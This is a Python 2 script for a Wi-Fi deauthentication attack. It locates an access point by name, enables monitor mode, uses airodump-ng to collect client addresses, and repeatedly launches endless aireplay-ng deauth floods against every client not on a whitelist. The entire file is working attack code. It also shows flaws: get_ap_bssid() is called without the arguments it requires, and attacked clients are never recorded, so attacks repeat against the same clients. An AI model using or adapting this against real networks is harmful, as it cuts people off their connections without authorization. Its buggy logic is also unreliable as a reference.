#!/usr/bin/env python2

import csv
import re
import sys
import time
from subprocess import Popen, PIPE

from parse_args import parse_args

attack_clients = set()
attack_pids    = set()

MAC_REGEX  = r'[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}'
TMP_PREFIX = '/tmp/airodump-output'

class Target(object):
    def __init__(self):
        self.bssid = self.channel = self.power = None

    def __nonzero__(self):
        return self.bssid and self.channel and self.power

def get_clients(f):
    """Extract set of MAC addresses from given airodump CSV output file."""

    regex = re.compile(MAC_REGEX)

    with open(f, 'rb') as csvfile:
        reader  = csv.reader(csvfile)
        clients = {row[0] for row in reader if row and regex.match(row[0])}

    return clients

def open_or_die(args, communicate=True):
    try:
        p = Popen(args, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    except OSError as e:
        sys.exit(e)

    if not communicate:
        return p

    out, err = p.communicate()
    if p.returncode:
        sys.exit(err)
    return out

def get_ap_bssid(interface, essid):
    """Find BSSID of strongest AP matching specified ESSID."""

    output = open_or_die(['iwlist', interface, 'scan'])
    target = Target()
    valid  = False

    essid_re   = re.compile(r'"(.*)"$')
    bssid_re   = re.compile(r'Address: ({})$'.format(MAC_REGEX))
    power_re   = re.compile(r'level=([^\S]+)$')
    channel_re = re.compile(r'Channel:(\d+)')

    for line in reversed(output.splitlines()):
        l = line.strip()
        if not len(l):
            continue
        if l.startswith('ESSID'):
            valid = False
            m = essid_re.search(l)
            if m and m.group(1) == essid:
                valid = True
                continue
        if not valid:
            continue
        if l.startswith('Quality'):
            m = power_re.search(l)
            if m and (not target.power or int(m.group(1)) > int(target.power)):
                target.power = m.group(1)
            else:
                valid = False
        elif l.startswith('Channel'):
            m = channel_re.search(l)
            if m:
                target.channel = int(m.group(1))
            else:
                valid = False
        elif l.startswith('Cell'):
            m = bssid_re.search(l)
            if m:
                target.bssid = m.group(1)
            else:
                valid = False
    return target

def initialise_interface(interface):
    """Bring up wireless interface; has no effect if interface already up."""
    open_or_die(['ifconfig', interface, 'up'])

def create_monitor_interface(interface, channel):
    """Create a monitoring interface with the given wlan interface and channel."""
    output = open_or_die(['airmon-ng', 'start', interface, str(channel)])
    m = re.compile(r'monitor mode enabled on ([^)]+)').search(output)
    return m.group(1) if m else None

def start_airodump(iface, channel, bssid):
    """Start (and detach from) airodump process.

    The process will regularly write its output to a CSV file in /tmp/
    """

    tmpfile = '{}{}'.format(TMP_PREFIX, int(time.time()))

    p = open_or_die(['airodump-ng', iface, '-c', str(channel),
                     '--bssid', bssid, '-w', tmpfile, '-o', 'csv'],
                    communicate=False)

    return p.pid, tmpfile + '-01.csv'

def spawn_attack(iface, c_bssid, ap_bssid):
    """Spawn new aireplay instance to attack specific client."""

    p = open_or_die(['aireplay-ng', '-0', '0', iface, '-c', c_bssid,
                     '-a', ap_bssid, '--ignore-negative-one'],
                    communicate=False)
    return p.pid

def start_attack(output, iface, bssid, whitelist):
    """Spawn instances for each network client not in the given whitelist."""
    while True:
        for item in get_clients(output) - attack_clients:
            if item != bssid and item not in whitelist:
                pid = spawn_attack(iface, item, bssid)
                attack_pids.add(pid)
        time.sleep(5)

if __name__ == '__main__':
    args = parse_args()

    print 'Bringing up interface "{}"...'.format(args.interface)
    initialise_interface(args.interface)
    print '> OK'

    print 'Finding BSSID for "{}"...'.format(args.essid)
    target = get_ap_bssid()
    if not target:
        sys.exit('Failed to find BSSID for "{}"! Check that the ESSID is '
                 'correct and that you are in range'.format(args.essid))
    print ('> Found "{}": BSSID={}, Channel={}, Power={}'
           .format(args.essid, target.bssid, target.channel, target.power))

    print 'Creating monitoring interface on channel {}...'.format(target.channel)
    mon = create_monitor_interface(args.interface, target.channel)
    if not mon:
        sys.exit('Failed to create monitoring interface!')
    print '> Created monitoring interface ' + mon

    print 'Spawning airodump process...'
    pid, output = start_airodump(mon, target.channel, target.bssid)
    print '> airodump pid={}, writing to {}'.format(pid, output)

    print 'Starting attack manager...'
    start_attack(output, mon, target.bssid, set(args.whitelist))
